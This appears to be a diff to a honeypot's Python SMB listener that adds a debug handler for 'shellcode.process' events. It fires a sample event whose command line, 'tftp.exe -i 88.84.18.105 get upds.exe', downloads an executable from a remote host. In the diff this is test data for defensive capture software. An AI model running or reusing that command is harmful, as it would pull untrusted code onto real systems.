@@ -9,10 +9,17 @@ class SmbConnection(NetworkEndpoint):
 		log(L_INFO, 'New connection, timeout after %is idle time.' % self.timeouts.sustain)
 
 	def connectionClosed(self):
+		dispatchEvent('shellcode.process', { 'commandline': 'tftp.exe -i 88.84.18.105 get upds.exe', 'recorder': self.getRecorder() } )
+
 		log(L_INFO, 'Connection has been closed.')
 
 	def dataRead(self, buf):
 		log(L_SPAM, buf.decode('latin1').replace('\r\n', '').replace('\n', ''))
+
+
+class DebugEventHandler:
+	def __init__(self, name, event):
+		log(L_SPAM, '%s: %s' % (name, repr(event)))
 
 
 def start():
@@ -21,7 +28,11 @@ def start():
 	global smb_server
 	smb_server = NetworkServer(('any', 1337), SmbConnection)
 
-	dispatchEvent('python.test', { 'foo': 'bar', 'number': 42 })
+	global process_handler
+
+	process_handler = EventSubscription('shellcode.process', DebugEventHandler)
+	process_handler.register()
+
 
 	return True
 
@@ -29,5 +40,8 @@ def start():
 def stop():
 	global smb_server
 	smb_server.close()
+
+	global process_handler
+	process_handler.unregister()
 
 	return True
